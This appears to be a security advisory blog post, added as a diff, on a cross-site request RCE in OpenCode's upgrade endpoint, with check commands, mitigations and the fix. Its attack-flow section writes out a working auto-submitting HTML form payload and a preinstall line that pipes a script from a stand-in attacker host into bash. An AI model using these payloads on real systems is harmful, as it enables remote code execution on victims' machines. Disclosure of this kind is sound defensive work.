@@ -1,0 +1,263 @@
+---
+title: "Beware: OpenCode Cross-Site Upgrade RCE Lets Any Website Install Malicious Packages on Your Machine"
+pubDate: 2026-10-20
+updatedDate: 2026-10-20
+description: "A critical RCE vulnerability in OpenCode (GHSA-632h-h47v-g4x4) allows any website to trigger arbitrary package installation and code execution via the `/global/upgrade` endpoint. Affects npm/pnpm/Bun installations running `opencode serve`. Patched in 1.18.22."
+tags: ["security", "beware", "opencode", "rce", "vulnerability"]
+tool: "opencode"
+---
+
+## TL;DR
+
+**If you installed OpenCode via npm, pnpm, or Bun and run `opencode serve`, any website you visit can execute arbitrary code on your machine.** Update to **1.18.22 or later** immediately. Run `opencode --version` to check your version.
+
+---
+
+## What Happened
+
+On September 24, 2026, Datadog Security Labs disclosed **GHSA-632h-h47v-g4x4** — a critical remote code execution vulnerability in OpenCode's HTTP server upgrade endpoint.
+
+The vulnerability works like this:
+
+1. You install OpenCode via npm/pnpm/Bun: `npm install -g opencode-ai`
+2. You start the HTTP server: `opencode serve` (runs on port 4096 by default)
+3. You visit a malicious website (or a compromised legitimate site)
+4. That website sends a cross-site request to `http://127.0.0.1:4096/global/upgrade`
+5. OpenCode blindly runs `npm install -g opencode-ai@<attacker-controlled-url>`
+6. The attacker's malicious package executes its `preinstall` script **as your user**
+
+The attacker doesn't need your password. They don't need you to click anything. Just visiting the page is enough — **if your browser has cached HTTP Basic credentials** (which happens after you authenticate once).
+
+---
+
+## The Technical Details (Plain English)
+
+### The Vulnerable Endpoint
+
+OpenCode exposes `/global/upgrade` to let you update the tool from the web UI. The request looks like:
+
+```http
+POST /global/upgrade HTTP/1.1
+Host: 127.0.0.1:4096
+Content-Type: text/plain
+
+{"target":"1.18.1","x":"="}
+```
+
+When OpenCode is installed via npm, it runs:
+```bash
+npm install -g opencode-ai@1.18.1
+```
+
+### The Problem: npm Accepts URLs, Not Just Versions
+
+npm package specs can point to **any tarball URL**:
+
+```bash
+npm install -g opencode-ai@http://attacker.com/malicious.tgz
+```
+
+The `/global/upgrade` endpoint didn't validate that `target` was a version number. It passed whatever you sent straight to npm.
+
+### The Problem: No Origin Check
+
+The endpoint didn't verify the request came from OpenCode's own UI. Any website can submit a form to `http://127.0.0.1:4096/global/upgrade`.
+
+### The Problem: `text/plain` Bypasses CORS
+
+Browsers block cross-origin `application/json` requests. But they **allow** cross-origin `text/plain` form submissions. OpenCode parsed `text/plain` bodies as JSON anyway — so the browser happily sent the attack.
+
+### The Attack Flow
+
+1. Attacker creates a malicious npm package with a `preinstall` script:
+   ```json
+   {"scripts": {"preinstall": "curl attacker.com/steal.sh | bash"}}
+   ```
+2. Attacker hosts it at `http://attacker.com/opencode-malicious.tgz`
+3. Attacker creates a page with an auto-submitting form:
+   ```html
+   <form method="POST" enctype="text/plain" action="http://127.0.0.1:4096/global/upgrade">
+     <input type="hidden" name='{"target":"http://attacker.com/opencode-malicious.tgz","x":"' value='"}'>
+   </form>
+   <script>document.forms[0].submit()</script>
+   ```
+4. You visit the page (via phishing link, malicious ad, compromised site)
+5. Browser sends the form with your cached Basic Auth credentials
+6. OpenCode installs the malicious package → **RCE as your user**
+
+---
+
+## Who Is Affected
+
+**You are vulnerable if ALL of these are true:**
+
+| Condition | Check Command |
+|-----------|---------------|
+| OpenCode installed via npm, pnpm, or Bun | `which opencode` → shows `/usr/local/bin/opencode` or similar |
+| Running `opencode serve` (HTTP server) | `ps aux | grep "opencode serve"` |
+| Version between **1.14.30 and 1.18.16** | `opencode --version` |
+| Browser has cached credentials for `opencode:password` | You've logged into the web UI at least once |
+
+**You are NOT affected if:**
+- Installed via curl, Homebrew, Chocolatey, or Scoop (standalone binaries)
+- Not running `opencode serve` (CLI-only usage)
+- Version **1.18.22 or later**
+
+---
+
+## How to Check If You're Vulnerable
+
+Run these commands **right now**:
+
+```bash
+# 1. Check your version
+opencode --version
+# If output shows < 1.18.22 → VULNERABLE
+
+# 2. Check installation method
+which opencode
+# If path contains "npm", "pnpm", "bun", or ".local" → npm-based install
+
+# 3. Check if server is running
+ps aux | grep "opencode serve"
+# If you see a process → server is running
+
+# 4. Check what port it's on (default 4096)
+lsof -i :4096
+# Or: netstat -an | grep 4096
+```
+
+**Quick one-liner:**
+```bash
+opencode --version && echo "---" && which opencode && echo "---" && ps aux | grep "opencode serve" | grep -v grep
+```
+
+---
+
+## How to Protect Yourself
+
+### Immediate Fix: Update OpenCode
+
+```bash
+# npm
+npm install -g opencode-ai@latest
+
+# pnpm
+pnpm add -g opencode-ai@latest
+
+# bun
+bun add -g opencode-ai@latest
+
+# Verify
+opencode --version
+# Should show 1.18.22 or higher
+```
+
+### If You Can't Update Right Now
+
+**Stop the HTTP server immediately:**
+```bash
+pkill -f "opencode serve"
+```
+
+**Or disable the upgrade endpoint** (add to your OpenCode config):
+```json
+{
+  "server": {
+    "disableUpgrade": true
+  }
+}
+```
+
+**Use a firewall rule** to block external access to port 4096:
+```bash
+# Windows (PowerShell as Admin)
+New-NetFirewallRule -DisplayName "Block OpenCode Port" -Direction Inbound -LocalPort 4096 -Protocol TCP -Action Block
+
+# Linux/macOS
+sudo ufw deny 4096
+```
+
+**Don't run `opencode serve` in the background** while browsing. Start it only when you need the web UI, stop it when done.
+
+---
+
+## Is There a Fix?
+
+**Yes — version 1.18.22** (released shortly after the September 24 disclosure).
+
+The fix (PR #44686) does four things:
+
+1. **Requires `application/json` content type** — blocks `text/plain` form submissions
+2. **Validates `target` is a semver string** — rejects URLs and tarball paths
+3. **Uses typed request decoder** — no more raw `request.text()` parsing
+4. **Rejects bodyless requests** — upgrade must include explicit target
+
+```typescript
+// Before (vulnerable)
+const body = await request.text();
+const { target } = JSON.parse(body);
+await run(['npm', 'install', '-g', `opencode-ai@${target}`]);
+
+// After (patched)
+const { target } = await request.json(); // Only accepts application/json
+if (!semver.valid(target)) throw new Error('Invalid version');
+await run(['npm', 'install', '-g', `opencode-ai@${target}`]);
+```
+
+---
+
+## Related: The Other OpenCode RCE (CVE-2026-22812)
+
+This isn't OpenCode's first critical RCE. **CVE-2026-22812** (GHSA-vxw4-wv6m-9hhh, January 2026) exposed an **unauthenticated HTTP server** that let any local process — or any website via permissive CORS — execute arbitrary shell commands.
+
+| Vulnerability | CVE/GHSA | Patched | Attack Vector |
+|---------------|----------|---------|---------------|
+| Unauthenticated HTTP server | CVE-2026-22812 / GHSA-vxw4-wv6m-9hhh | 1.0.216 | Local process + browser (CORS) |
+| Cross-site upgrade RCE | GHSA-632h-h47v-g4x4 | 1.18.22 | Cross-site form + cached auth |
+
+**If you're on an old version, you likely have BOTH.** Update to 1.18.22+ to fix both.
+
+---
+
+## Why This Matters for AI Coding Agent Users
+
+OpenCode isn't the only agent with this problem. The pattern repeats:
+
+| Agent | Similar Issue | Status |
+|-------|---------------|--------|
+| **Cursor** | CVE-2026-26268 (git hook RCE), CVE-2026-48124 | Patched |
+| **Claude Code** | GitHub Action supply chain (Clinejection) | Mitigated |
+| **Cline** | Unauthorized npm publish (cline@2.3.0) | Fixed |
+| **OpenCode** | **Two RCEs in 2026** | **Patch applied** |
+
+**The root cause:** AI coding agents run local HTTP servers with high privileges to support web UIs, but often skip basic web security (auth, CORS, CSRF, input validation).
+
+---
+
+## Checklist: Are You Safe?
+
+- [ ] `opencode --version` shows **1.18.22 or higher**
+- [ ] If you use `opencode serve`, you **stop it when not actively using the web UI**
+- [ ] You **don't run the server on `0.0.0.0`** (no `--mdns`/Bonjour)
+- [ ] You **set `OPENCODE_SERVER_PASSWORD`** and use a strong password
+- [ ] You **clear browser credentials** for localhost:4096 after each session
+- [ ] You **monitor** `ps aux | grep opencode` for unexpected processes
+
+---
+
+## References
+
+- **GHSA-632h-h47v-g4x4 Advisory**: https://github.com/anomalyco/opencode/security/advisories/GHSA-632h-h47v-g4x4
+- **Datadog Security Labs Writeup**: https://securitylabs.datadoghq.com/articles/opencode-upgrade-remote-code-execution/
+- **CVE-2026-22812 (Previous RCE)**: https://github.com/advisories/GHSA-vxw4-wv6m-9hhh
+- **OpenCode Changelog**: https://opencode.ai/changelog
+- **Fix PR #44686**: https://github.com/anomalyco/opencode/pull/44686
+
+---
+
+## Affiliate Disclosure
+
+This article contains affiliate links. If you purchase through them, we may earn a commission at no extra cost to you. We only recommend tools we've verified.
+
+**Stay safe. Update your tools. Don't run untrusted servers.** 🔒
